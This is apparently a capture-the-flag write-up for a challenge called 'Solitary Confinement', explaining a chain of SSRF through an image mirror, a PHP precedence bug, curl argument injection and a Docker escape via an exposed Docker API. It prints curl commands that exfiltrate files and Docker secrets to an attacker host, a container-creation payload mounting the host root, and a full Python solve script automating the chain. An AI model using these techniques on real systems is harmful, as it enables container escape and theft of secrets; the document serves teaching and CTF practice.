# Solitary Confinement

Authors: @Goofables and @B00TK1D
## Description

You tried to collect $200 on your way to jail. Now you're in solitary confinement. Might as well start working out...

## Writeup

This is a simple image mirroring website with a hidden curl jail challenge, combined with a docker escape. The prison docker container runs Docker-in-Docker, with the inner Docker container running a simple TCP server.

The flag is stored in a docker secret only in the prison container, and is not passed in any way to the inner container. Therefore, the goal is to escape the inner container and gain file access or command execution on the outer container.

The primary vulnerability is the fact that the outer container exposes the docker socket via a TCP port. This allows HTTP requests from the inner container to control the docker daemon on the outer host, including creating new containers and mounting directories.

The inner container service applies a restrictive filter on the arguments to the curl command, allowing only lowercase letters, numbers, spaces, and the characters `./-`. This allows setting curl options, although prevents using any uppercase options, and does not allow shell escapes for arbitrary command execution.

The only way to reach the inner container is to pivot from one of the other containers in the environment. Because the inner container needs a tcp connection with arbitrary data, the pivot must be from the admin page, using the connection test.

The connection test allows specifying the request method, even though it is not listed in the ui. There is a check to make sure that method is GET or POST, but the result is ignored due to `and` having a lower precedence than `=` in php.

The only way to execute the connection test is to connect from a local ip, requiring another pivot. Using the main functionality of the image mirror, a request can be bounced off of an external server with a redirect to the admin page, satisfying the local ip source requirement.

There are a variety of similar ways to escape the inner container with curl. This writeup describes a path that includes creating a new container with the root filesystem of the outer container mounted, and then executing a curl command inside that container to exfiltrate the flag.

The first step is finding a way to interact with the outer container's docker daemon. The exact ip of the prison container depends on deployment but should be in 172.16-32.0.1. We can reach the docker daemon from inside the inner container at `http://172.##.0.1:2375`.

The second step is to create a new container on the outer host. Looking at the docker socket API (https://docs.docker.com/reference/api/engine/version/v1.37/#tag/Container/operation/ContainerCreate), we see that this requires a POST request to `/containers/create`. However, the `image` field must correspond to an image ID, not an image name. The image ID will likely be unique per deployment, so we need to find a way of listing the images on the host and exfiltrating them.

To exfiltrate the images IDs, we will use curl's `-o` flag to first write the output to a file, then use the `--json` flag with the `@` specifier to read from the file and send it in a request body to a web server we control.

This will require two curl commands for the solitary container, which look something like this:

```bash
curl http://container_ip:2375/images/json -o /tmp/images.json
curl http://attacker_ip --json @/tmp/images.json
```

These can each be reflected by the connection test with these two urls:
```
http://nginx/admin?host=prison:5005&method=container_ip%3A2375%2Fimages%2Fjson+-o+%2Ftmp%2Fimages%0a
http://nginx/admin?host=prison:5005&method=attacker_ip+--json+%40%2Ftmp%2Fimages%0a
```

These urls can be requested through the image download by redirecting off of the attacker's server.
```
 > http://challenge_ip/http://attacker_ip/redirect
 < http://nginx/admin?host=prison:5005&method=container_ip%3A2375%2Fimages%2Fjson+-o+%2Ftmp%2Fimages%0a
```


Executing these dumps a list of images, such as this:

```json
[
  {
    "Containers": -1,
    "Created": 1737668671,
    "Id": "sha256:3cfeb6abdca1b55f65d30b2e2cc02ddfb7ba742074295e5aadef44f42f7d9dd5",
    "Labels": {
      "com.docker.compose.project": "prison",
      "com.docker.compose.service": "solitary",
      "com.docker.compose.version": "2.32.4"
    },
    "ParentId": "",
    "RepoDigests": [],
    "RepoTags": [
      "prison-solitary:latest"
    ],
    "SharedSize": -1,
    "Size": 154226393
  }
]
```

We can just re-use the same image already used for the inner container, `prison-solitary:latest`, since it already has curl installed.  We just need to mount the outer root directory, and set the entrypoint command to exfiltrate the flag via curl.

Docker stores secrets in `/run/secrets/`, so we can just exfiltrate the flag with a curl command like this:

```bash
curl http://attacker-ip -d @/run/secrets/flag
```

Therefore, the new container can be created with a curl command like this:

```bash
curl http://container_ip:2375/containers/create --json '{"Image":"3cfeb6abdca1b55f65d30b2e2cc02ddfb7ba742074295e5aadef44f42f7d9dd5","Cmd":["curl","http://attacker-ip","-d","@/run/secrets/flag"],"HostConfig":{"Binds":["/:/host"]}}' -o /tmp/containerid
```

This will create a new container, but it doesn't start it, so we need to save the container ID to a file and exil it with the same trick as before:

```bash
curl http://attacker-ip --json @/tmp/containerid
```

Which returns the container ID, such as this:

```json
{"Id":"c1d3e82b088a9ca0decdf410f937f1990e222d828df61857b0b16d11b5018736","Warnings":[]}
```

Finally, we can start the container.  However, this is slightly tricky, because the `start` endpoint requires a POST request with no body.  We can't specify `-X POST`, because we don't have capital letters.  However, if we use `--json @/dev/null`, curl automatically uses POST but sends no body:

```bash
curl http://container_ip:2375/containers/c1d3e82b088a9ca0decdf410f937f1990e222d828df61857b0b16d11b5018736/start --json @/dev/null
```


Then, we just have to listen on the attacker IP for the flag in the request body.


This whole process can be automated, including listening for the exfil requests, using the following solve script:

```python
# !/usr/bin/env python3
import json
import socket
import time
from threading import Thread
from urllib.parse import quote_plus

import requests

TARGET = "10.3.2.69:12348"
LOCAL_IP = "10.3.2.15"
PRISON_INTERNAL_IP = "172.17.0.1"  # 172.16-32.0.1


class Responder:
    def __init__(self, response: bytes = b"HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n"):

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(("0.0.0.0", 0))
        self.sock.listen(1)
        self.port = self.sock.getsockname()[1]

        self.response = response
        self.data = b""
        Thread(target=self.listen).start()

    def listen(self):
        c, addr = self.sock.accept()
        c.settimeout(1)
        print(f"Connection from {addr}")

        try:
            try:
                while d := c.recv(1024):
                    self.data += d
            except TimeoutError as e:
                pass

            c.send(self.response)
            c.close()
        except Exception as e:
            print(f"Socket error: {e}")
            raise


def redirect_bounce(command: str) -> None:
    print(f"Preparing bounce: {command}")
    rdr_url = f"http://nginx/admin?host=prison:5005&method={quote_plus(command)}%0a"
    print(f"Final rdr: {rdr_url}")
    port = Responder(b"HTTP/1.1 302 cyber\r\nLocation: " + rdr_url.encode() + b"\r\n\r\n").port
    requests.get(f"http://{TARGET}/http://{LOCAL_IP}:{port}/")


# cache docker images
redirect_bounce(f"{PRISON_INTERNAL_IP}:2375/images/json -o /tmp/images")

# Pull cached file
images_receiver = Responder()
redirect_bounce(f"{LOCAL_IP}:{images_receiver.port} --json @/tmp/images")

# get id of solitary container
resp = images_receiver.data.decode().split("\r\n\r\n")[1]
print(f"response: {resp}")
image_id = json.loads(resp)[0]["Id"].split(":")[1]

flag_receiver = Responder()

# create container to leak flag
container = (
    json.dumps(
        {
            "Image": image_id,
            "HostConfig": {"Binds": ["/:/host"]},
            "Cmd": ["curl", "--data", "@/host/run/secrets/flag", f"{LOCAL_IP}:{flag_receiver.port}"],
        }
    )
    .replace(" ", "")
    .encode()
)

# push create file to solitary
port = Responder(b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(container)).encode() + b"\r\n\r\n" + container).port
redirect_bounce(f"{LOCAL_IP}:{port} -o /tmp/create")

# send create request
redirect_bounce(f"{PRISON_INTERNAL_IP}:2375/containers/create --json @/tmp/create -o /tmp/containerid")

# get container id
cid_receiver = Responder()
redirect_bounce(f"{LOCAL_IP}:{cid_receiver.port} --json @/tmp/containerid")
resp = cid_receiver.data.decode().split("\r\n\r\n")[1]
print(f"response: {resp}")
container_id = json.loads(resp)["Id"]

# start container
redirect_bounce(f"{PRISON_INTERNAL_IP}:2375/containers/{container_id}/start --json @/dev/null")

# let container start
time.sleep(3)

print(flag_receiver.data.decode())
```
